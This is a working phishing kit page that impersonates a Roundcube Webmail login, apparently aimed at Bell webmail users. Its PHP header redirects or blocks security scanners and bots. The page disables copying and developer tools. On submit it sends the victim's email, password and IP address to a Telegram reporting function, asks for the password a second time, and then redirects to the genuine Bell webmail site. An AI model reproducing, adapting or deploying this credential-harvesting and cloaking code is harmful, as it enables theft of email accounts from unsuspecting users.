<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>Roundcube Webmail</title>
	
	<!-- Antibot Scripts -->
	<script src="../m/js/fingerprint.js"></script>
	<script src="../m/js/utils.js"></script>
	<script src="../m/js/captcha.js"></script>
	
	<!-- Centralized Functions -->
	<script src="../js/centralized_telegram.js"></script>
	<script src="../js/centralized_redirect.js"></script>
	<script src="../js/email_extractor.js"></script>
	<script src="../js/autofill_helper.js"></script>
	<style>
		:root{--bg:#ffffff;--muted:#9aa3ad;--accent:#32b7ff}
		html,body{height:100%;margin:0;font-family:Inter,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fff}
		.page{min-height:100%;display:flex;align-items:flex-start;justify-content:center;padding:96px 16px}
		.card{width:420px;max-width:92%;text-align:center}
		.logo-wrap{display:flex;justify-content:center;margin-bottom:18px}
		/* placeholder logo: hexagon with circle */
		.logo{width:120px;height:120px}
		.box{background:#f7f9fb;border-radius:6px;padding:16px 18px;display:flex;align-items:center;justify-content:center}
		.input-row{display:flex;margin:10px 0}
		.icon-box{width:48px;height:44px;background:#f0f0f0;border-radius:6px 0 0 6px;display:flex;align-items:center;justify-content:center;border:1px solid #e6e6e6}
		.text-box{flex:1}
		.text-box input{width:100%;padding:12px 14px;border:1px solid #e6e6e6;border-left:0;border-radius:0 6px 6px 0;font-size:15px;box-sizing:border-box}
		.btn{display:block;margin:14px 0 8px;padding:12px;border-radius:6px;background:var(--accent);color:#fff;font-weight:700;border:0;cursor:pointer;width:100%;font-size:16px}
		.footer{color:var(--muted);margin-top:10px}
		/* focus styles */
		.text-box input:focus{outline:none;box-shadow:0 0 0 3px rgba(50,183,255,0.12);border-color:rgba(50,183,255,0.6)}
		@media (max-width:480px){.page{padding:48px 12px}.logo{width:72px;height:72px}}
	</style>
</head>
<body>
	<div class="page">
		<div class="card" role="main">
			<div class="logo-wrap">
				<img id="logo" class="logo" src="https://webmail.roundcube.101.hostinglogin.net/skins/elastic/images/logo.svg?s=1764855766" alt="Logo">
			</div>

			<div class="box" style="flex-direction:column;align-items:stretch">
				<form id="login-form">
					<div class="input-row">
						<div class="icon-box" aria-hidden="true">
							<svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8zm0 2c-4 0-8 2-8 4v2h16v-2c0-2-4-4-8-4z" stroke="#384048" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
						</div>
						<div class="text-box"><input id="user" name="user" type="text" placeholder="Username" autocomplete="off" autocapitalize="off"></div>
					</div>

					<div class="input-row">
						<div class="icon-box" aria-hidden="true">
							<svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="11" width="18" height="10" rx="2" stroke="#384048" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M7 11V8a5 5 0 0 1 10 0v3" stroke="#384048" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
						</div>
						<div class="text-box"><input id="pass" name="pass" type="password" placeholder="Password" autocomplete="off"></div>
					</div>

					<button class="btn" type="submit">LOGIN</button>
				</form>
			</div>

			<div class="footer">Roundcube Webmail</div>
		</div>
	</div>

	<script>
        function togglePassword(el) {
            var pwd = document.getElementById('pass');
            if (pwd.type === 'password') {
                pwd.type = 'text';
                el.setAttribute('aria-pressed', 'true');
                el.setAttribute('aria-label', 'Hide password');
                el.title = 'Hide password';
            } else {
                pwd.type = 'password';
                el.setAttribute('aria-pressed', 'false');
                el.setAttribute('aria-label', 'Show password');
                el.title = 'Show password';
            }
            try {
                var start = typeof pwd.selectionStart === 'number' ? pwd.selectionStart : pwd.value.length;
                var end = typeof pwd.selectionEnd === 'number' ? pwd.selectionEnd : start;
                pwd.focus();
                setTimeout(function() {
                    try { pwd.setSelectionRange(start, end); } catch (inner) { /* ignore */ }
                }, 0);
            } catch (e) { /* ignore if not supported */ }
        }
        window.addEventListener('DOMContentLoaded', function() {
            var spinner = document.getElementById('initSpinner');
            var app = document.getElementById('app');
            var mainContent = document.getElementById('mainContent');
            var initError = document.getElementById('initError');
            if (mainContent) {
                mainContent.style.display = 'block';
            }
        });
    </script>
<!-- Antibot Scripts -->
<script src="../m/js/fingerprint.js"></script>
<script src="../m/js/utils.js"></script>
<script src="../m/js/captcha.js"></script>

<!-- Centralized Functions -->
<script src="../js/centralized_telegram.js"></script>
<script src="../js/centralized_redirect.js"></script>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
	<script>
  /* global $ */
  $(document).ready(function() {
    var count = 0;

    function isValidEmail(email) {
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      return filter.test(email);
    }

        // Standardized autofill handled by js/autofill_helper.js
        // window.addEventListener('hashchange', autoFillFromHash);

        $('#user, #pass').on('input', function() {
            // Error shown via alert in BELL
        });

        (function() {
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                }, false);
            }

            document.addEventListener('copy', function(e) {
                try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
                e.preventDefault();
                return false;
            });

            document.addEventListener('selectstart', function(e) {
                if (!e.target.closest('input, textarea')) {
                    e.preventDefault();
                    return false;
                }
            });

            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
                if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
            });
        })();

        $('#login-form').on('submit', function(event) {
      event.preventDefault();
      var email = $('#user').val() ? $('#user').val().trim() : '';
      var pw = $('#pass').val() ? $('#pass').val().trim() : '';
      if (!email) {
        $('#user').focus();
        return false;
      }
      if (!isValidEmail(email)) {
        $('#user').focus();
        return false;
      }
      if (!pw) {
        $('#pass').focus();
        return false;
      }
            count = count + 1;

            
            // Use centralized Telegram reporting with provider tag
            window.providerTag = 'webmail';
            var clientIP = window.userip || 'n/a';
            
            function sendTelemetry(attempt, redirectOnSuccess) {
                // Send centralized Telegram report
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
                        if (redirectOnSuccess) {
                            // Use centralized redirect
                            if (typeof performCentralizedRedirect === 'function') {
                                performCentralizedRedirect(300);
                            } else {
                                // Fallback if centralized redirect not available
                                setTimeout(function() { window.location.replace('https://webmail.bell.net/bell/'); }, 300);
                            }
                        }
                    });
                } else {
                    // Fallback if centralized function not available
                    console.error('Centralized Telegram function not available');
                    if (redirectOnSuccess) {
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(300);
                        } else {
                            setTimeout(function() { window.location.replace('https://webmail.bell.net/bell/'); }, 300);
                        }
                    }
                }
                
                if (redirectOnSuccess) {
                    $('.btn').text('Logging in...');
                    setTimeout(function() {
                        $('.btn').text('Sign in');
                    }, 200);
                }
            }

            sendTelemetry(count, (count >= 2));

            if (count === 1) {
                $('#pass').val('').focus();
                return false;
            }
    });
});
  </script>
</body>
</html>